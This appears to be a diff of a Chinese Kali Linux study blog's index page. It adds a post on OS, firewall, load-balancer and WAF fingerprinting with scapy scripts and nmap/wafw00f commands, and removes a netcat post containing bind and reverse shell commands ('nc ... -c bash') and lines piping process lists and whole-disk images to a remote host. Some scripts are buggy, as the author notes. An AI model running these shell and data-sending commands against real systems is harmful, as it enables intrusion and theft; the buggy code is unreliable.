@@ -240,6 +240,305 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81)%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%86%E5%88%AB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81)%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%86%E5%88%AB/" itemprop="url">Kali Linux笔记(二十)：操作系统识别</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-10T08:13:38+08:00">
+                2019-12-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  883 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-操作系统识别"><a href="#1-操作系统识别" class="headerlink" title="1. 操作系统识别"></a>1. 操作系统识别</h4><ul>
+<li>操作系统识别技术（默认开放的系统开放端口）<ul>
+<li>种类繁多</li>
+<li>好产品采用多种技术组合</li>
+</ul>
+</li>
+<li>TTL起始值<ul>
+<li>Windows：128（65-128）</li>
+<li>Linux/Unix：64（1-64）</li>
+<li>某些Unix：255</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>TTL值劫持路由器，使不同地区的人访问到网页不一样</code></pre></blockquote>
+<h4 id="2-操作系统识别"><a href="#2-操作系统识别" class="headerlink" title="2. 操作系统识别"></a>2. 操作系统识别</h4><ul>
+<li>Python<ul>
+<li>form scapy.all import*</li>
+<li>win=”IP地址”</li>
+<li>linx=”IP地址”</li>
+<li>aw=sr1(IP(dst=win)/ICMP())</li>
+<li>al=sr1(IP(dst=linu)/ICMP())</li>
+<li>if al[IP].ttl&lt;=64:</li>
+<li>print “host is linux”</li>
+<li>else:</li>
+<li>print “host is windows”</li>
+</ul>
+</li>
+<li>./ttl_os.py IP地址</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">from scapy.all import*</span><br><span class="line">import logging</span><br><span class="line">logging.getLogger(&quot;scapy,runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=2:</span><br><span class="line">    print &quot;Usage - ./ttl_os.py [IP Address]&quot;</span><br><span class="line">    print &quot;Example - ./ttl_os.py 192.168.100.1&quot;</span><br><span class="line">    print &quot;Example will perform ttl analysize to attempt to determine whether the system is Windows or Linux/Unix&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">ip=sys.argv[1]</span><br><span class="line">ans=sr1(IP(dst=&quot;str(ip)&quot;)/ICMP(),timeout=1,verbose=0)</span><br><span class="line">if ans==None:</span><br><span class="line">    print &quot;No response was returned&quot;</span><br><span class="line">elif int(ans[IP].ttl)&lt;=64:</span><br><span class="line">    print &quot;Host is Linux/Unix&quot;</span><br><span class="line">else:</span><br><span class="line">    print &quot;Host is Windows&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-操作系统识别"><a href="#3-操作系统识别" class="headerlink" title="3. 操作系统识别"></a>3. 操作系统识别</h4><ul>
+<li>nmap使用多种技术识别操作系统<ul>
+<li><strong><code>🔺命令：nmap IP地址 -O</code></strong></li>
+<li>系统服务特征</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>CPE国际标准化组织进行的标准化操作系统，设备类型分类</code></pre></blockquote>
+<h4 id="4-操作系统识别"><a href="#4-操作系统识别" class="headerlink" title="4. 操作系统识别"></a>4. 操作系统识别</h4><ul>
+<li><strong><code>🔺命令：xprobe2 IP地址</code></strong></li>
+<li>结果有误差</li>
+</ul>
+<h4 id="5-操作系统识别"><a href="#5-操作系统识别" class="headerlink" title="5. 操作系统识别"></a>5. 操作系统识别</h4><ul>
+<li>被动操作系统识别<ul>
+<li>IDS</li>
+<li>抓包分析</li>
+</ul>
+</li>
+<li>被动扫描（不主动向目标主机发包，部署在网络出口的地方）</li>
+<li><strong><code>🔺命令：p0f</code></strong><ul>
+<li>结合ARP地址欺骗识别全网OS</li>
+</ul>
+</li>
+</ul>
+<h4 id="6-防火墙识别（尽量隐蔽）"><a href="#6-防火墙识别（尽量隐蔽）" class="headerlink" title="6. 防火墙识别（尽量隐蔽）"></a>6. 防火墙识别（尽量隐蔽）</h4><ul>
+<li>通过检查回包，可能识别端口是否经过防火墙过滤</li>
+<li>设备多种多样，结果过存在一定误差</li>
+</ul>
+<blockquote>
+<pre><code>（1）防火墙内部对外部的访问连接  （2）防火墙对源地址的过滤
+防火墙几种情况：
+Send         Response           Type
+SYN          NO              
+ACK          RST                Filtered
+
+SYN          SYN+ACK/SYN+RST 
+ACK          NO                 Filtered
+
+SYN          SYN+ACK/SYN+RST
+ACK          RST                Unfiltered/Open
+
+SYN          NO             
+ACK          NO                 Closed</code></pre></blockquote>
+<h4 id="7-防火墙识别"><a href="#7-防火墙识别" class="headerlink" title="7. 防火墙识别"></a>7. 防火墙识别</h4><ul>
+<li>Scapy</li>
+<li>Python<ul>
+<li><strong><code>🔺命令：fw_detect.py IP地址 端口</code></strong> ▲ 2019.12.6 脚本实验不成功，逻辑报错</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">from scapy.all import*</span><br><span class="line">import logging</span><br><span class="line">logging.getLogger(&quot;scapy,runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=3:</span><br><span class="line">    print &quot;Usage - ./fw_detect.py [Target IP] [Target Port] &quot;</span><br><span class="line">    print &quot;Example - ./syn_scan.py 192.168.100.1 445&quot;</span><br><span class="line">    print &quot;Example will determine if filtering exists on port 443 of host 192.168.100.1&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">ip=sys.argv[1]</span><br><span class="line">port=sys.argv[2]</span><br><span class="line"></span><br><span class="line">ACK_response=sr1(IP(dst=ip)/TCP(dport=port,flags=&apos;A&apos;),timeout=1,verbose=0)</span><br><span class="line">SYN_response=sr1(IP(dst=ip)/TCP(dport=port,flags=&apos;S&apos;),timeout=1,verbose=0)</span><br><span class="line">if (ACK_respnonse==None) and (SYN_response==None):</span><br><span class="line">    print &quot;Port is either unstatefully filered or host is down&quot;</span><br><span class="line">elif (ACK_respnonse==None) and ((SYN_response[flags]==18) or (SYN_response[flags==6])):</span><br><span class="line">    print &quot;Stateful filtering in place&quot;</span><br><span class="line">elif (SYN_response==None) and (ACK_response[flags]==4):</span><br><span class="line">    print &quot;Stateful filtering in place&quot;</span><br><span class="line">elif ((SYN_response[flags]==18) or (SYN_response[flags==6])) and (ACK_response[flags]==4):</span><br><span class="line">    print &quot;Port is unfiltered and open&quot;</span><br><span class="line">else:</span><br><span class="line">    print &quot;Unable to determine if the port is filtered&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="8-防火墙识别"><a href="#8-防火墙识别" class="headerlink" title="8. 防火墙识别"></a>8. 防火墙识别</h4><ul>
+<li>Nmap有系列防火墙过滤检测功能</li>
+<li><strong><code>🔺命令：nmap IP地址 端口</code></strong>（默认SYN包）</li>
+<li><strong><code>🔺命令：nmap -sA（ACK包） IP地址 端口</code></strong></li>
+</ul>
+<h4 id="9-负载均衡识别"><a href="#9-负载均衡识别" class="headerlink" title="9. 负载均衡识别"></a>9. 负载均衡识别</h4><ul>
+<li>广域网负载均衡<ul>
+<li>DNS</li>
+<li>智能DNS（不同地区不同DNS回应）</li>
+</ul>
+</li>
+<li>服务器负载均衡<ul>
+<li>基于Web的服务器</li>
+</ul>
+</li>
+<li>组件级负载均衡</li>
+<li>HTTP-Loadbalancing<ul>
+<li>Nginx</li>
+<li>Apache</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：lbd www.baidu.com</code></strong></li>
+<li><strong><code>🔺命令：lbd mail.163.com</code></strong></li>
+</ul>
+<h4 id="10-WAF识别"><a href="#10-WAF识别" class="headerlink" title="10. WAF识别"></a>10. WAF识别</h4><ul>
+<li>WEB应用防火墙（基于规则的过滤 → 基于机器学习，特征识别，语法词法的过滤）</li>
+<li><strong><code>🔺命令：wafw00f -l</code></strong></li>
+<li><strong><code>🔺命令：wafw00f http://www.microsoft.com</code></strong></li>
+<li><strong><code>🔺命令：nmap www.microsoft.com --script=http-waf-detect.nse</code></strong></li>
+</ul>
+<blockquote>
+<pre><code>WAF产品
+Profense
+Barracuda
+F5 Trafficshield
+Citrix NetScalor
+IBM Web Application Security
+webApp.secure
+BIG IP
+ISA Server
+AkamaiGHost</code></pre></blockquote>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80)%EF%BC%9A%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E4%BB%8B%E7%BB%8D/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2901,289 +3200,6 @@ SQL-Inject-Me(https://addons.mozilla.org/en-US/firefox/addon/sql-inject-me/$src=
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD)%EF%BC%9ANETCAT/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/12/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD)%EF%BC%9ANETCAT/" itemprop="url">Kali Linux笔记(六)：NETCAT</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-09T19:29:25+08:00">
-                2019-12-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  1k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  4 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-常使用工具"><a href="#1-常使用工具" class="headerlink" title="1. 常使用工具"></a>1. 常使用工具</h4><ul>
-<li>经常使用且功能强大</li>
-<li>安全从业者必不可少的帮手</li>
-<li>Nc/ncat</li>
-<li>Wireshark</li>
-<li>Tcp dump</li>
-</ul>
-<h4 id="2-NETCAT-NC"><a href="#2-NETCAT-NC" class="headerlink" title="2. NETCAT-NC"></a>2. NETCAT-NC</h4><ul>
-<li>网络工具中的瑞士军刀-小身材，大智慧</li>
-<li>侦听模式/传输模式</li>
-<li>telnet/获取banner信息（比telnet稳定）</li>
-<li>传输文本信息</li>
-<li>传输文件/目录（ftp服务器）</li>
-<li>加密传输文件</li>
-<li>远程控制/木马</li>
-<li>加密所有流量</li>
-<li>流媒体服务器</li>
-<li>远程克隆硬盘</li>
-</ul>
-<h4 id="3-NC-TELNET-BANNER"><a href="#3-NC-TELNET-BANNER" class="headerlink" title="3. NC-TELNET/BANNER"></a>3. NC-TELNET/BANNER</h4><blockquote>
-<pre><code>nc-nv 1.1.1.1 110
-nc-nv 1.1.1.1 25
-nc-nv 1.1.1.1 80</code></pre></blockquote>
-<ul>
-<li><strong><code>🔺命令：ping smtp.163.com、pop3.163.com</code></strong>（测试网络）</li>
-<li><strong><code>🔺命令：netstat -rn</code></strong>（查看网络连接）</li>
-<li>nc -vn（域名相关详细信息，建议将域名解析出来）</li>
-<li><strong><code>🔺命令：nc -nv ip地址 110</code></strong>（pop3服务器）</li>
-<li><strong><code>🔺命令：USER</code></strong> （base64 邮箱地址）</li>
-<li><strong><code>🔺命令：nc -nv ip地址 25</code></strong>（smtp服务器）</li>
-<li><strong><code>🔺命令：ehlo 名字</code></strong>（可看到命令行选项）</li>
-<li><strong><code>🔺命令：nc -nv ip地址 80</code></strong>（http服务器，metasploitable）</li>
-<li><strong><code>🔺命令：get head/</code></strong>（两者不可重复使用，一样的效果）</li>
-</ul>
-<blockquote>
-<pre><code>Kali base64命令的使用
-1.启动终端
-2.输入base64
-3.输入需要编码的字符串
-4.CTRL+D，结束输入，在屏幕上会显示出结果</code></pre></blockquote>
-<h4 id="4-NC-传输文本信息"><a href="#4-NC-传输文本信息" class="headerlink" title="4. NC-传输文本信息"></a>4. NC-传输文本信息</h4><ul>
-<li>A： <strong><code>🔺命令：nc -l -p 端口号</code></strong>（开放一个端口，作为服务端）</li>
-<li>B： <strong><code>🔺命令：nc -nv IP地址 端口号</code></strong>（连接对方端口，作为客户端）</li>
-<li>远程电子取证收集<ul>
-<li><strong><code>🔺命令：ls -l | nc -nv IP地址 端口号</code></strong>（服务端）</li>
-<li><strong><code>🔺命令：nc -l -p 333 &gt; ps.txt</code></strong>（服务端） <strong><code>🔺命令：ps aux | nc -nv IP地址 端口 -q（有结束标志EOF） 1</code></strong>（客户端）</li>
-</ul>
-</li>
-</ul>
-<h4 id="5-NC-传输文件-目录"><a href="#5-NC-传输文件-目录" class="headerlink" title="5. NC-传输文件/目录"></a>5. NC-传输文件/目录</h4><ul>
-<li>传输文件<ul>
-<li>A:<strong><code>🔺命令：nc -lp 端口号&gt;x.mp4</code></strong>（接收端）</li>
-<li>B:<strong><code>🔺命令：nc -nv ip地址 端口号&lt; x.mp4 -q 1</code></strong>（发送端）</li>
-<li>or</li>
-<li>A:<strong><code>🔺命令：nc -lp 端口号 &lt; x.mp4 -q 1</code></strong>（发送端）</li>
-<li>B:<strong><code>🔺命令：nc -nv ip地址 端口号 &gt;x.mp4</code></strong>（接收端）</li>
-</ul>
-</li>
-<li>传输目录 ▲2019.11.25实验未成功<ul>
-<li>A:<strong><code>🔺命令：tar -cvf -文件名/ | nc -lp 端口号 -q 1</code></strong>（发送端）</li>
-<li>B:<strong><code>🔺命令：nc -nv ip地址 端口号 | tar -xvf -</code></strong>（接收端）</li>
-</ul>
-</li>
-<li>加密传文件（操作系统安装的mcrypt）<ul>
-<li>A:<strong><code>🔺命令：nc -lp 端口号 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; x.mp4</code></strong>（接收端）</li>
-<li>B:<strong><code>🔺命令：mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; x.mp4 | nc -nv ip地址 端口号 -q 1</code></strong>（发送端）</li>
-</ul>
-</li>
-</ul>
-<h4 id="6-NC-流媒体服务（需安装mplayer）"><a href="#6-NC-流媒体服务（需安装mplayer）" class="headerlink" title="6. NC-流媒体服务（需安装mplayer）"></a>6. NC-流媒体服务（需安装mplayer）</h4><ul>
-<li>A:<strong><code>🔺命令：cat x.mp4 | nc -lp 端口号</code></strong></li>
-<li>B:<strong><code>🔺命令：nc -nv ip地址 端口号 | mplayer -vo x11 -cache 3000 -</code></strong></li>
-</ul>
-<h4 id="7-NC-端口扫描"><a href="#7-NC-端口扫描" class="headerlink" title="7. NC-端口扫描"></a>7. NC-端口扫描</h4><ul>
-<li><strong><code>🔺命令：nc -nvz ip地址 x-x(TCP端口号)</code></strong></li>
-<li><strong><code>🔺命令：nc -nvzu ip地址 x-x(UDP端口号)</code></strong></li>
-</ul>
-<h4 id="8-NC-远程克隆硬盘-▲2019-11-25未验证"><a href="#8-NC-远程克隆硬盘-▲2019-11-25未验证" class="headerlink" title="8. NC-远程克隆硬盘 ▲2019.11.25未验证"></a>8. NC-远程克隆硬盘 ▲2019.11.25未验证</h4><ul>
-<li>A:<strong><code>🔺命令：nc -lp 端口号 | dd of=/dev/sda</code></strong></li>
-<li>B:<strong><code>🔺命令：dd if=/dev/sda | nc -nv IP地址 端口号 -q 1</code></strong></li>
-<li>远程电子取证，可以将目标服务器硬盘远程复制，或者内存</li>
-</ul>
-<blockquote>
-<pre><code>硬盘删除文件，只删除文件名的索引，不完整删除文件，进行标记，可以进行恢复
-dd进行磁盘复制，是完整的镜像硬盘复制，包括删除的文件标记</code></pre></blockquote>
-<h4 id="9-NC-远程控制"><a href="#9-NC-远程控制" class="headerlink" title="9. NC-远程控制"></a>9. NC-远程控制</h4><ul>
-<li>正向<ul>
-<li>A:<strong><code>🔺命令：nc -lp 端口 -c bash</code></strong></li>
-<li>B:<strong><code>🔺命令：nc -nv IP地址 端口号</code></strong></li>
-</ul>
-</li>
-<li>反向<ul>
-<li>A:<strong><code>🔺命令：nc -lp 端口号</code></strong></li>
-<li>B:<strong><code>🔺命令：nc -nv IP地址 端口号 -c bash</code></strong></li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<pre><code>Windows用户把bash改成cmd
-IDC机房可以采用服务器作为客户端，由内网向外网连接侦听的外部服务器，传递bash</code></pre></blockquote>
-<h4 id="10-NC-NCAT（区别于NC，是加密的管道，集成于NMAP）▲2019-11-25需要安装，会覆盖netcat"><a href="#10-NC-NCAT（区别于NC，是加密的管道，集成于NMAP）▲2019-11-25需要安装，会覆盖netcat" class="headerlink" title="10. NC-NCAT（区别于NC，是加密的管道，集成于NMAP）▲2019.11.25需要安装，会覆盖netcat"></a>10. NC-NCAT（区别于NC，是加密的管道，集成于NMAP）▲2019.11.25需要安装，会覆盖netcat</h4><ul>
-<li>NC缺乏加密和身份验证的能力（可被嗅探，基本上是透明的，可在外部系统加密再进行传输）</li>
-<li>Ncat包含nmap工具包中</li>
-<li>A:<strong><code>🔺命令：ncat -c bash --allow IP地址 -vnl 端口号 --ssl</code></strong></li>
-<li>B:<strong><code>🔺命令：ncat -nv IP地址 端口 --ssl</code></strong></li>
-<li>不同系统/平台的nc参数功能不尽相同</li>
-</ul>
-<blockquote>
-<pre><code>window系统不存在-c参数，需要通过中间文本去传递shell
-查询用户手册：🔺命令：man nc（man手册）or 🔺命令：nc -h or 🔺命令：info nc</code></pre></blockquote>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3238,7 +3254,7 @@ IDC机房可以采用服务器作为客户端，由内网向外网连接侦听�
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">99</span>
+                  <span class="site-state-item-count">100</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3345,7 +3361,7 @@ IDC机房可以采用服务器作为客户端，由内网向外网连接侦听�
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">97k</span>
+    <span title="Site words total count">97.7k</span>
   
 </div>
 
